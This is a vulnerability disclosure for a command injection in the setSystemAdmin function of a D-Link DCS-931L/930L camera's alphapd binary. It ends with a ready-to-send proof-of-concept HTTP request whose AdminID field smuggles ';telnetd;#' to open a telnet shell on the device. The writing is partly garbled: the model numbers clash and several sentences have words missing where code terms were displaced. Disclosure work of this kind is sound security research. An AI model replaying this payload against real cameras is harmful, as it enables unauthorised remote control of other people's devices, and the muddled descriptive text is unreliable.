# D-Link DCS931L  Command Execution
Affected Product: D-Link DCS930L

Affected Firmware Versions: v1.0.0-v1.13.0

Vulnerability Type: Command Execution



# Vulnerability Description
A command injection vulnerability exists in the setSystemAdmin function of the alphapd binary in D-Link DCS-931L firmware v1.0.0-1.13.0.   
The AdminID parameter is directly taken from user input and inserted into shell commands without proper sanitization, allowing remote attackers to execute arbitrary OS commands via crafted requests.

# Vulnerability Details
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/58401686/1770388551425-7252a76b-6835-4866-9d50-d7239eee1903.png)

<font style="color:rgb(31, 35, 40);">In the handler of the binary, the input is first checked in .</font>`<font style="color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);">setSystemAdmin</font>``<font style="color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);">alphapd</font>``<font style="color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);">CheckSystemVar</font>`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/58401686/1770376471046-a1575adf-cb73-4095-960b-fca98c814a02.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/58401686/1770376643865-9b16434f-f9a9-4443-8dd1-1dbe56699dc5.png)<font style="color:rgb(31, 35, 40);">Then, the function further checks . However, only cleans up HTML whitespace characters in the input string and limits the input length to a minimum of 1 and a maximum of 12, without restricting the content.</font>`<font style="color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);">AdminPassword</font>``<font style="color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);">checkrangestring</font>`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/58401686/1770376705130-ff3f7dcf-f7b0-4683-8b9b-aaff83c95132.png)

<font style="color:rgb(31, 35, 40);">The value comes directly from attacker-controlled input. Because the input is not properly restricted, it is directly inserted into the shell command, which allows the attacker to construct an that triggers arbitrary command execution.</font>

# <font style="color:rgb(31, 35, 40);">POC</font>
<font style="color:rgb(31, 35, 40);"></font>









<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/58401686/1770384399647-ec548f84-cf05-4124-8373-bdf3db9671ab.png)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/58401686/1770384392720-853df346-8aa3-44a5-8ee1-91ed14dbc320.png)

```plain
POST /setSystemAdmin HTTP/1.1
Host: 192.168.0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 122
Origin: http://192.168.0.2
Authorization: Basic YWRtaW46MjJiOWRoY2Y=
Connection: keep-alive
Referer: http://192.168.0.2/advanced.htm
Upgrade-Insecure-Requests: 1
Priority: u=0, i

ReplySuccessPage=advanced.htm&ReplyErrorPage=errradv.htm&AdminID=';telnetd;#&AdminPassword=admin123&ConfigSystemAdmin=Save
```

